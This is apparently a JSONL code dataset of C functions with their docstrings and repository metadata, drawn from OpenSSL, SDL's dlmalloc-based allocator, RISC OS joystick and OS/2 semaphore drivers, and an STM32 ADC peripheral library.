{"docstring": "/*\n * free anything we allocated earlier when initting a\n * session, and close the session.\n */\n", "func_signal": "static int\ncryptodev_cleanup(EVP_CIPHER_CTX *ctx)", "code": "{\n\tint ret = 0;\n\tstruct dev_crypto_state *state = ctx->cipher_data;\n\tstruct session_op *sess = &state->d_sess;\n\n\tif (state->d_fd < 0)\n\t\treturn (0);\n\n\t/* XXX if this ioctl fails, someting's wrong. the invoker\n\t * may have called us with a bogus ctx, or we could\n\t * have a device that for whatever reason just doesn't\n\t * want to play ball - it's not clear what's right\n\t * here - should this be an error? should it just\n\t * increase a counter, hmm. For right now, we return\n\t * 0 - I don't believe that to be \"right\". we could\n\t * call the gorpy openssl lib error handlers that\n\t * print messages to users of the library. hmm..\n\t */\n\n\tif (ioctl(state->d_fd, CIOCFSESSION, &sess->ses) == -1) {\n\t\tret = 0;\n\t} else {\n\t\tret = 1;\n\t}\n\tclose(state->d_fd);\n\tstate->d_fd = -1;\n\n\treturn (ret);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/* The following function generates an ASN1_STRING based on limits in a table.\n * Frequently the types and length of an ASN1_STRING are restricted by a \n * corresponding OID. For example certificates and certificate requests.\n */\n", "func_signal": "ASN1_STRING *ASN1_STRING_set_by_NID(ASN1_STRING **out, const unsigned char *in,\n\t\t\t\t\tint inlen, int inform, int nid)", "code": "{\n\tASN1_STRING_TABLE *tbl;\n\tASN1_STRING *str = NULL;\n\tunsigned long mask;\n\tint ret;\n\tif(!out) out = &str;\n\ttbl = ASN1_STRING_TABLE_get(nid);\n\tif(tbl) {\n\t\tmask = tbl->mask;\n\t\tif(!(tbl->flags & STABLE_NO_MASK)) mask &= global_mask;\n\t\tret = ASN1_mbstring_ncopy(out, in, inlen, inform, mask,\n\t\t\t\t\ttbl->minsize, tbl->maxsize);\n\t} else ret = ASN1_mbstring_copy(out, in, inlen, inform, DIRSTRING_TYPE & global_mask);\n\tif(ret <= 0) return NULL;\n\treturn *out;\n}", "path": "crypto\\asn1\\a_strnid.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/* Function to open a joystick for use.\n   The joystick to open is specified by the index field of the joystick.\n   This should fill the nbuttons and naxes fields of the joystick structure.\n   It returns 0, or -1 if there is an error.\n */\n", "func_signal": "int SDL_SYS_JoystickOpen(SDL_Joystick *joystick)", "code": "{\n\t_kernel_swi_regs regs;\n\n\tif(!(joystick->hwdata=SDL_malloc(sizeof(struct joystick_hwdata))))\n\t\treturn -1;\n\n\tregs.r[0] = joystick->index;\n\n\t/* Don't know how to get exact count of buttons so assume max of 4 for now */\n\tjoystick->nbuttons=4;\n\n\tjoystick->nhats=0;\n\tjoystick->nballs=0;\n\tjoystick->naxes=2;\n\tjoystick->hwdata->joystate=0;\n\n\treturn 0;\n\n}", "path": "SDL-1.2.14\\src\\joystick\\riscos\\SDL_sysjoystick.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* ------------------------ comalloc/coalloc support --------------------- */\n", "func_signal": "static void** ialloc(mstate m,\n                     size_t n_elements,\n                     size_t* sizes,\n                     int opts,\n                     void* chunks[])", "code": "{\n  /*\n    This provides common support for independent_X routines, handling\n    all of the combinations that can result.\n\n    The opts arg has:\n    bit 0 set if all elements are same size (using sizes[0])\n    bit 1 set if elements should be zeroed\n  */\n\n  size_t    element_size;   /* chunksize of each element, if all same */\n  size_t    contents_size;  /* total size of elements */\n  size_t    array_size;     /* request size of pointer array */\n  void*     mem;            /* malloced aggregate space */\n  mchunkptr p;              /* corresponding chunk */\n  size_t    remainder_size; /* remaining bytes while splitting */\n  void**    marray;         /* either \"chunks\" or malloced ptr array */\n  mchunkptr array_chunk;    /* chunk for malloced ptr array */\n  flag_t    was_enabled;    /* to disable mmap */\n  size_t    size;\n  size_t    i;\n\n  /* compute array length, if needed */\n  if (chunks != 0) {\n    if (n_elements == 0)\n      return chunks; /* nothing to do */\n    marray = chunks;\n    array_size = 0;\n  }\n  else {\n    /* if empty req, must still return chunk representing empty array */\n    if (n_elements == 0)\n      return (void**)internal_malloc(m, 0);\n    marray = 0;\n    array_size = request2size(n_elements * (sizeof(void*)));\n  }\n\n  /* compute total element size */\n  if (opts & 0x1) { /* all-same-size */\n    element_size = request2size(*sizes);\n    contents_size = n_elements * element_size;\n  }\n  else { /* add up all the sizes */\n    element_size = 0;\n    contents_size = 0;\n    for (i = 0; i != n_elements; ++i)\n      contents_size += request2size(sizes[i]);\n  }\n\n  size = contents_size + array_size;\n\n  /*\n     Allocate the aggregate chunk.  First disable direct-mmapping so\n     malloc won't use it, since we would not be able to later\n     free/realloc space internal to a segregated mmap region.\n  */\n  was_enabled = use_mmap(m);\n  disable_mmap(m);\n  mem = internal_malloc(m, size - CHUNK_OVERHEAD);\n  if (was_enabled)\n    enable_mmap(m);\n  if (mem == 0)\n    return 0;\n\n  if (PREACTION(m)) return 0;\n  p = mem2chunk(mem);\n  remainder_size = chunksize(p);\n\n  assert(!is_mmapped(p));\n\n  if (opts & 0x2) {       /* optionally clear the elements */\n    memset((size_t*)mem, 0, remainder_size - SIZE_T_SIZE - array_size);\n  }\n\n  /* If not provided, allocate the pointer array as final part of chunk */\n  if (marray == 0) {\n    size_t  array_chunk_size;\n    array_chunk = chunk_plus_offset(p, contents_size);\n    array_chunk_size = remainder_size - contents_size;\n    marray = (void**) (chunk2mem(array_chunk));\n    set_size_and_pinuse_of_inuse_chunk(m, array_chunk, array_chunk_size);\n    remainder_size = contents_size;\n  }\n\n  /* split out elements */\n  for (i = 0; ; ++i) {\n    marray[i] = chunk2mem(p);\n    if (i != n_elements-1) {\n      if (element_size != 0)\n        size = element_size;\n      else\n        size = request2size(sizes[i]);\n      remainder_size -= size;\n      set_size_and_pinuse_of_inuse_chunk(m, p, size);\n      p = chunk_plus_offset(p, size);\n    }\n    else { /* the final element absorbs any overallocation slop */\n      set_size_and_pinuse_of_inuse_chunk(m, p, remainder_size);\n      break;\n    }\n  }\n\n#if DEBUG\n  if (marray != chunks) {\n    /* final element must have exactly exhausted chunk */\n    if (element_size != 0) {\n      assert(remainder_size == element_size);\n    }\n    else {\n      assert(remainder_size == request2size(sizes[i]));\n    }\n    check_inuse_chunk(m, mem2chunk(marray));\n  }\n  for (i = 0; i != n_elements; ++i)\n    check_inuse_chunk(m, mem2chunk(marray[i]));\n\n#endif /* DEBUG */\n\n  POSTACTION(m);\n  return marray;\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Unmap and unlink any mmapped segments that don't contain used chunks */\n", "func_signal": "static size_t release_unused_segments(mstate m)", "code": "{\n  size_t released = 0;\n  msegmentptr pred = &m->seg;\n  msegmentptr sp = pred->next;\n  while (sp != 0) {\n    char* base = sp->base;\n    size_t size = sp->size;\n    msegmentptr next = sp->next;\n    if (is_mmapped_segment(sp) && !is_extern_segment(sp)) {\n      mchunkptr p = align_as_chunk(base);\n      size_t psize = chunksize(p);\n      /* Can unmap if first chunk holds entire segment and not pinned */\n      if (!cinuse(p) && (char*)p + psize >= base + size - TOP_FOOT_SIZE) {\n        tchunkptr tp = (tchunkptr)p;\n        assert(segment_holds(sp, (char*)sp));\n        if (p == m->dv) {\n          m->dv = 0;\n          m->dvsize = 0;\n        }\n        else {\n          unlink_large_chunk(m, tp);\n        }\n        if (CALL_MUNMAP(base, size) == 0) {\n          released += size;\n          m->footprint -= size;\n          /* unlink obsoleted record */\n          sp = pred;\n          sp->next = next;\n        }\n        else { /* back out if cannot unmap */\n          insert_large_chunk(m, tp, psize);\n        }\n      }\n    }\n    pred = sp;\n    sp = next;\n  }\n  return released;\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* --------------------------- realloc support --------------------------- */\n", "func_signal": "static void* internal_realloc(mstate m, void* oldmem, size_t bytes)", "code": "{\n  if (bytes >= MAX_REQUEST) {\n    MALLOC_FAILURE_ACTION;\n    return 0;\n  }\n  if (!PREACTION(m)) {\n    mchunkptr oldp = mem2chunk(oldmem);\n    size_t oldsize = chunksize(oldp);\n    mchunkptr next = chunk_plus_offset(oldp, oldsize);\n    mchunkptr newp = 0;\n    void* extra = 0;\n\n    /* Try to either shrink or extend into top. Else malloc-copy-free */\n\n    if (RTCHECK(ok_address(m, oldp) && ok_cinuse(oldp) &&\n                ok_next(oldp, next) && ok_pinuse(next))) {\n      size_t nb = request2size(bytes);\n      if (is_mmapped(oldp))\n        newp = mmap_resize(m, oldp, nb);\n      else if (oldsize >= nb) { /* already big enough */\n        size_t rsize = oldsize - nb;\n        newp = oldp;\n        if (rsize >= MIN_CHUNK_SIZE) {\n          mchunkptr remainder = chunk_plus_offset(newp, nb);\n          set_inuse(m, newp, nb);\n          set_inuse(m, remainder, rsize);\n          extra = chunk2mem(remainder);\n        }\n      }\n      else if (next == m->top && oldsize + m->topsize > nb) {\n        /* Expand into top */\n        size_t newsize = oldsize + m->topsize;\n        size_t newtopsize = newsize - nb;\n        mchunkptr newtop = chunk_plus_offset(oldp, nb);\n        set_inuse(m, oldp, nb);\n        newtop->head = newtopsize |PINUSE_BIT;\n        m->top = newtop;\n        m->topsize = newtopsize;\n        newp = oldp;\n      }\n    }\n    else {\n      USAGE_ERROR_ACTION(m, oldmem);\n      POSTACTION(m);\n      return 0;\n    }\n\n    POSTACTION(m);\n\n    if (newp != 0) {\n      if (extra != 0) {\n        internal_free(m, extra);\n      }\n      check_inuse_chunk(m, newp);\n      return chunk2mem(newp);\n    }\n    else {\n      void* newmem = internal_malloc(m, bytes);\n      if (newmem != 0) {\n        size_t oc = oldsize - overhead_for(oldp);\n        memcpy(newmem, oldmem, (oc < bytes)? oc : bytes);\n        internal_free(m, oldmem);\n      }\n      return newmem;\n    }\n  }\n  return 0;\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Realloc using mmap */\n", "func_signal": "static mchunkptr mmap_resize(mstate m, mchunkptr oldp, size_t nb)", "code": "{\n  size_t oldsize = chunksize(oldp);\n  if (is_small(nb)) /* Can't shrink mmap regions below small size */\n    return 0;\n  /* Keep old chunk if big enough but not too big */\n  if (oldsize >= nb + SIZE_T_SIZE &&\n      (oldsize - nb) <= (mparams.granularity << 1))\n    return oldp;\n  else {\n    size_t offset = oldp->prev_foot & ~IS_MMAPPED_BIT;\n    size_t oldmmsize = oldsize + offset + MMAP_FOOT_PAD;\n    size_t newmmsize = granularity_align(nb + SIX_SIZE_T_SIZES +\n                                         CHUNK_ALIGN_MASK);\n    char* cp = (char*)CALL_MREMAP((char*)oldp - offset,\n                                  oldmmsize, newmmsize, 1);\n    if (cp != CMFAIL) {\n      mchunkptr newp = (mchunkptr)(cp + offset);\n      size_t psize = newmmsize - offset - MMAP_FOOT_PAD;\n      newp->head = (psize|CINUSE_BIT);\n      mark_inuse_foot(m, newp, psize);\n      chunk_plus_offset(newp, psize)->head = FENCEPOST_HEAD;\n      chunk_plus_offset(newp, psize+SIZE_T_SIZE)->head = 0;\n\n      if (cp < m->least_addr)\n        m->least_addr = cp;\n      if ((m->footprint += newmmsize - oldmmsize) > m->max_footprint)\n        m->max_footprint = m->footprint;\n      check_mmapped_chunk(m, newp);\n      return newp;\n    }\n  }\n  return 0;\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Function to close a joystick after use */\n", "func_signal": "void SDL_SYS_JoystickClose(SDL_Joystick *joystick)", "code": "{\n\tif(joystick->hwdata)\n\t\tSDL_free(joystick->hwdata);\n\treturn;\n}", "path": "SDL-1.2.14\\src\\joystick\\riscos\\SDL_sysjoystick.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* This function supports releasing coalesed segments */\n", "func_signal": "static int win32munmap(void* ptr, size_t size)", "code": "{\n  MEMORY_BASIC_INFORMATION minfo;\n  char* cptr = ptr;\n  while (size) {\n    if (VirtualQuery(cptr, &minfo, sizeof(minfo)) == 0)\n      return -1;\n    if (minfo.BaseAddress != cptr || minfo.AllocationBase != cptr ||\n        minfo.State != MEM_COMMIT || minfo.RegionSize > size)\n      return -1;\n    if (VirtualFree(cptr, 0, MEM_RELEASE) == 0)\n      return -1;\n    cptr += minfo.RegionSize;\n    size -= minfo.RegionSize;\n  }\n  return 0;\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Allocate chunk and prepend remainder with chunk in successor base. */\n", "func_signal": "static void* prepend_alloc(mstate m, char* newbase, char* oldbase,\n                           size_t nb)", "code": "{\n  mchunkptr p = align_as_chunk(newbase);\n  mchunkptr oldfirst = align_as_chunk(oldbase);\n  size_t psize = (char*)oldfirst - (char*)p;\n  mchunkptr q = chunk_plus_offset(p, nb);\n  size_t qsize = psize - nb;\n  set_size_and_pinuse_of_inuse_chunk(m, p, nb);\n\n  assert((char*)oldfirst > (char*)q);\n  assert(pinuse(oldfirst));\n  assert(qsize >= MIN_CHUNK_SIZE);\n\n  /* consolidate remainder with first chunk of old base */\n  if (oldfirst == m->top) {\n    size_t tsize = m->topsize += qsize;\n    m->top = q;\n    q->head = tsize | PINUSE_BIT;\n    check_top_chunk(m, q);\n  }\n  else if (oldfirst == m->dv) {\n    size_t dsize = m->dvsize += qsize;\n    m->dv = q;\n    set_size_and_pinuse_of_free_chunk(q, dsize);\n  }\n  else {\n    if (!cinuse(oldfirst)) {\n      size_t nsize = chunksize(oldfirst);\n      unlink_chunk(m, oldfirst, nsize);\n      oldfirst = chunk_plus_offset(oldfirst, nsize);\n      qsize += nsize;\n    }\n    set_free_with_pinuse(q, qsize, oldfirst);\n    insert_chunk(m, q, qsize);\n    check_free_chunk(m, q);\n  }\n\n  check_malloced_chunk(m, chunk2mem(p), nb);\n  return chunk2mem(p);\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Function to scan the system for joysticks.\n * This function should set SDL_numjoysticks to the number of available\n * joysticks.  Joystick 0 should be the system default joystick.\n * It should return number of joysticks, or -1 on an unrecoverable fatal error.\n */\n", "func_signal": "int SDL_SYS_JoystickInit(void)", "code": "{\n\t_kernel_swi_regs regs;\n\n\t /* Try to read joystick 0 */\n\tregs.r[0] = 0;\n\tif (_kernel_swi(JOYSTICK_READ, &regs, &regs) == NULL)\n\t{\n\t\t/* Switch works so assume we've got a joystick */\n\t\treturn 1;\n\t}\n\t/* Switch fails so it looks like there's no joystick here */\n\n\treturn(0);\n}", "path": "SDL-1.2.14\\src\\joystick\\riscos\\SDL_sysjoystick.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* allocate a large request from the best fitting chunk in a treebin */\n", "func_signal": "static void* tmalloc_large(mstate m, size_t nb)", "code": "{\n  tchunkptr v = 0;\n  size_t rsize = -nb; /* Unsigned negation */\n  tchunkptr t;\n  bindex_t idx;\n  compute_tree_index(nb, idx);\n\n  if ((t = *treebin_at(m, idx)) != 0) {\n    /* Traverse tree for this bin looking for node with size == nb */\n    size_t sizebits = nb << leftshift_for_tree_index(idx);\n    tchunkptr rst = 0;  /* The deepest untaken right subtree */\n    for (;;) {\n      tchunkptr rt;\n      size_t trem = chunksize(t) - nb;\n      if (trem < rsize) {\n        v = t;\n        if ((rsize = trem) == 0)\n          break;\n      }\n      rt = t->child[1];\n      t = t->child[(sizebits >> (SIZE_T_BITSIZE-SIZE_T_ONE)) & 1];\n      if (rt != 0 && rt != t)\n        rst = rt;\n      if (t == 0) {\n        t = rst; /* set t to least subtree holding sizes > nb */\n        break;\n      }\n      sizebits <<= 1;\n    }\n  }\n\n  if (t == 0 && v == 0) { /* set t to root of next non-empty treebin */\n    binmap_t leftbits = left_bits(idx2bit(idx)) & m->treemap;\n    if (leftbits != 0) {\n      bindex_t i;\n      binmap_t leastbit = least_bit(leftbits);\n      compute_bit2idx(leastbit, i);\n      t = *treebin_at(m, i);\n    }\n  }\n\n  while (t != 0) { /* find smallest of tree or subtree */\n    size_t trem = chunksize(t) - nb;\n    if (trem < rsize) {\n      rsize = trem;\n      v = t;\n    }\n    t = leftmost_child(t);\n  }\n\n  /*  If dv is a better fit, return 0 so malloc will use it */\n  if (v != 0 && rsize < (size_t)(m->dvsize - nb)) {\n    if (RTCHECK(ok_address(m, v))) { /* split */\n      mchunkptr r = chunk_plus_offset(v, nb);\n      assert(chunksize(v) == rsize + nb);\n      if (RTCHECK(ok_next(v, r))) {\n        unlink_large_chunk(m, v);\n        if (rsize < MIN_CHUNK_SIZE)\n          set_inuse_and_pinuse(m, v, (rsize + nb));\n        else {\n          set_size_and_pinuse_of_inuse_chunk(m, v, nb);\n          set_size_and_pinuse_of_free_chunk(r, rsize);\n          insert_chunk(m, r, rsize);\n        }\n        return chunk2mem(v);\n      }\n    }\n    CORRUPTION_ERROR_ACTION(m);\n  }\n  return 0;\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* support for mallopt */\n", "func_signal": "static int change_mparam(int param_number, int value)", "code": "{\n  size_t val = (size_t)value;\n  init_mparams();\n  switch(param_number) {\n  case M_TRIM_THRESHOLD:\n    mparams.trim_threshold = val;\n    return 1;\n  case M_GRANULARITY:\n    if (val >= mparams.page_size && ((val & (val-1)) == 0)) {\n      mparams.granularity = val;\n      return 1;\n    }\n    else\n      return 0;\n  case M_MMAP_THRESHOLD:\n    mparams.mmap_threshold = val;\n    return 1;\n  default:\n    return 0;\n  }\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Return segment holding given address */\n", "func_signal": "static msegmentptr segment_holding(mstate m, char* addr)", "code": "{\n  msegmentptr sp = &m->seg;\n  for (;;) {\n    if (addr >= sp->base && addr < sp->base + sp->size)\n      return sp;\n    if ((sp = sp->next) == 0)\n      return 0;\n  }\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Check properties of inuse chunks */\n", "func_signal": "static void do_check_inuse_chunk(mstate m, mchunkptr p)", "code": "{\n  do_check_any_chunk(m, p);\n  assert(cinuse(p));\n  assert(next_pinuse(p));\n  /* If not pinuse and not mmapped, previous chunk has OK offset */\n  assert(is_mmapped(p) || pinuse(p) || next_chunk(prev_chunk(p)) == p);\n  if (is_mmapped(p))\n    do_check_mmapped_chunk(m, p);\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* For direct MMAP, use MEM_TOP_DOWN to minimize interference */\n", "func_signal": "static void* win32direct_mmap(size_t size)", "code": "{\n  void* ptr = VirtualAlloc(0, size, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN,\n                           PAGE_READWRITE);\n  return (ptr != 0)? ptr: MFAIL;\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Note:  If we are terminated, this could be called in the middle of\n   another SDL video routine -- notably UpdateRects.\n*/\n", "func_signal": "void PG_VideoQuit(_THIS)", "code": "{\n\tif (this->screen->pixels != NULL)\n\t{\n\t\tshmdt(this->screen->pixels);\n\t\tthis->screen->pixels = NULL;\n\t\tpgDelete(this->hidden->bitmap);\n\t}\n\tpgDelete(this->hidden->wCanvas);\n\tpgDelete(this->hidden->wApp);\n}", "path": "SDL-1.2.14\\src\\video\\picogui\\SDL_pgvideo.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Add a segment to hold a new noncontiguous region */\n", "func_signal": "static void add_segment(mstate m, char* tbase, size_t tsize, flag_t mmapped)", "code": "{\n  /* Determine locations and sizes of segment, fenceposts, old top */\n  char* old_top = (char*)m->top;\n  msegmentptr oldsp = segment_holding(m, old_top);\n  char* old_end = oldsp->base + oldsp->size;\n  size_t ssize = pad_request(sizeof(struct malloc_segment));\n  char* rawsp = old_end - (ssize + FOUR_SIZE_T_SIZES + CHUNK_ALIGN_MASK);\n  size_t offset = align_offset(chunk2mem(rawsp));\n  char* asp = rawsp + offset;\n  char* csp = (asp < (old_top + MIN_CHUNK_SIZE))? old_top : asp;\n  mchunkptr sp = (mchunkptr)csp;\n  msegmentptr ss = (msegmentptr)(chunk2mem(sp));\n  mchunkptr tnext = chunk_plus_offset(sp, ssize);\n  mchunkptr p = tnext;\n  int nfences = 0;\n\n  /* reset top to new space */\n  init_top(m, (mchunkptr)tbase, tsize - TOP_FOOT_SIZE);\n\n  /* Set up segment record */\n  assert(is_aligned(ss));\n  set_size_and_pinuse_of_inuse_chunk(m, sp, ssize);\n  *ss = m->seg; /* Push current record */\n  m->seg.base = tbase;\n  m->seg.size = tsize;\n  m->seg.sflags = mmapped;\n  m->seg.next = ss;\n\n  /* Insert trailing fenceposts */\n  for (;;) {\n    mchunkptr nextp = chunk_plus_offset(p, SIZE_T_SIZE);\n    p->head = FENCEPOST_HEAD;\n    ++nfences;\n    if ((char*)(&(nextp->head)) < old_end)\n      p = nextp;\n    else\n      break;\n  }\n  assert(nfences >= 2);\n\n  /* Insert the rest of old top into a bin as an ordinary free chunk */\n  if (csp != old_top) {\n    mchunkptr q = (mchunkptr)old_top;\n    size_t psize = csp - old_top;\n    mchunkptr tn = chunk_plus_offset(q, psize);\n    set_free_with_pinuse(q, psize, tn);\n    insert_chunk(m, q, psize);\n  }\n\n  check_top_chunk(m, m->top);\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* --------------------------- memalign support -------------------------- */\n", "func_signal": "static void* internal_memalign(mstate m, size_t alignment, size_t bytes)", "code": "{\n  if (alignment <= MALLOC_ALIGNMENT)    /* Can just use malloc */\n    return internal_malloc(m, bytes);\n  if (alignment <  MIN_CHUNK_SIZE) /* must be at least a minimum chunk size */\n    alignment = MIN_CHUNK_SIZE;\n  if ((alignment & (alignment-SIZE_T_ONE)) != 0) {/* Ensure a power of 2 */\n    size_t a = MALLOC_ALIGNMENT << 1;\n    while (a < alignment) a <<= 1;\n    alignment = a;\n  }\n  \n  if (bytes >= MAX_REQUEST - alignment) {\n    if (m != 0)  { /* Test isn't needed but avoids compiler warning */\n      MALLOC_FAILURE_ACTION;\n    }\n  }\n  else {\n    size_t nb = request2size(bytes);\n    size_t req = nb + alignment + MIN_CHUNK_SIZE - CHUNK_OVERHEAD;\n    char* mem = (char*)internal_malloc(m, req);\n    if (mem != 0) {\n      void* leader = 0;\n      void* trailer = 0;\n      mchunkptr p = mem2chunk(mem);\n\n      if (PREACTION(m)) return 0;\n      if ((((size_t)(mem)) % alignment) != 0) { /* misaligned */\n        /*\n          Find an aligned spot inside chunk.  Since we need to give\n          back leading space in a chunk of at least MIN_CHUNK_SIZE, if\n          the first calculation places us at a spot with less than\n          MIN_CHUNK_SIZE leader, we can move to the next aligned spot.\n          We've allocated enough total room so that this is always\n          possible.\n        */\n        char* br = (char*)mem2chunk((size_t)(((size_t)(mem +\n                                                       alignment -\n                                                       SIZE_T_ONE)) &\n                                             -alignment));\n        char* pos = ((size_t)(br - (char*)(p)) >= MIN_CHUNK_SIZE)?\n          br : br+alignment;\n        mchunkptr newp = (mchunkptr)pos;\n        size_t leadsize = pos - (char*)(p);\n        size_t newsize = chunksize(p) - leadsize;\n\n        if (is_mmapped(p)) { /* For mmapped chunks, just adjust offset */\n          newp->prev_foot = p->prev_foot + leadsize;\n          newp->head = (newsize|CINUSE_BIT);\n        }\n        else { /* Otherwise, give back leader, use the rest */\n          set_inuse(m, newp, newsize);\n          set_inuse(m, p, leadsize);\n          leader = chunk2mem(p);\n        }\n        p = newp;\n      }\n\n      /* Give back spare room at the end */\n      if (!is_mmapped(p)) {\n        size_t size = chunksize(p);\n        if (size > nb + MIN_CHUNK_SIZE) {\n          size_t remainder_size = size - nb;\n          mchunkptr remainder = chunk_plus_offset(p, nb);\n          set_inuse(m, p, nb);\n          set_inuse(m, remainder, remainder_size);\n          trailer = chunk2mem(remainder);\n        }\n      }\n\n      assert (chunksize(p) >= nb);\n      assert((((size_t)(chunk2mem(p))) % alignment) == 0);\n      check_inuse_chunk(m, p);\n      POSTACTION(m);\n      if (leader != 0) {\n        internal_free(m, leader);\n      }\n      if (trailer != 0) {\n        internal_free(m, trailer);\n      }\n      return chunk2mem(p);\n    }\n  }\n  return 0;\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Check properties of top chunk */\n", "func_signal": "static void do_check_top_chunk(mstate m, mchunkptr p)", "code": "{\n  msegmentptr sp = segment_holding(m, (char*)p);\n  size_t  sz = chunksize(p);\n  assert(sp != 0);\n  assert((is_aligned(chunk2mem(p))) || (p->head == FENCEPOST_HEAD));\n  assert(ok_address(m, p));\n  assert(sz == m->topsize);\n  assert(sz > 0);\n  assert(sz == ((sp->base + sp->size) - (char*)p) - TOP_FOOT_SIZE);\n  assert(pinuse(p));\n  assert(!next_pinuse(p));\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Free the semaphore */\n", "func_signal": "DECLSPEC void SDLCALL SDL_DestroySemaphore(SDL_sem *sem)", "code": "{\n        if ( sem ) {\n                if ( sem->id ) {\n                        DosCloseEventSem(sem->changed);\n                        DosCloseMutexSem(sem->id);\n                        sem->id = 0;\n                }\n                SDL_free(sem);\n        }\n}", "path": "SDL-1.2.14\\src\\thread\\os2\\SDL_syssem.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/* Check all properties of malloc_state. */\n", "func_signal": "static void do_check_malloc_state(mstate m)", "code": "{\n  bindex_t i;\n  size_t total;\n  /* check bins */\n  for (i = 0; i < NSMALLBINS; ++i)\n    do_check_smallbin(m, i);\n  for (i = 0; i < NTREEBINS; ++i)\n    do_check_treebin(m, i);\n\n  if (m->dvsize != 0) { /* check dv chunk */\n    do_check_any_chunk(m, m->dv);\n    assert(m->dvsize == chunksize(m->dv));\n    assert(m->dvsize >= MIN_CHUNK_SIZE);\n    assert(bin_find(m, m->dv) == 0);\n  }\n\n  if (m->top != 0) {   /* check top chunk */\n    do_check_top_chunk(m, m->top);\n    assert(m->topsize == chunksize(m->top));\n    assert(m->topsize > 0);\n    assert(bin_find(m, m->top) == 0);\n  }\n\n  total = traverse_and_check(m);\n  assert(total <= m->footprint);\n  assert(m->footprint <= m->max_footprint);\n}", "path": "SDL-1.2.14\\src\\stdlib\\SDL_malloc.c", "repo_name": "kengonakajima/book", "stars": 98, "license": "other", "language": "c", "size": 7611}
{"docstring": "/**\n  * @brief  Enables or disables the discontinuous mode on regular group\n  *         channel for the specified ADC\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC discontinuous mode\n  *         on regular group channel.\n  *         This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_DiscModeCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC regular discontinuous mode */\n    ADCx->CR1 |= CR1_DISCEN_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC regular discontinuous mode */\n    ADCx->CR1 &= CR1_DISCEN_Reset;\n  }\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
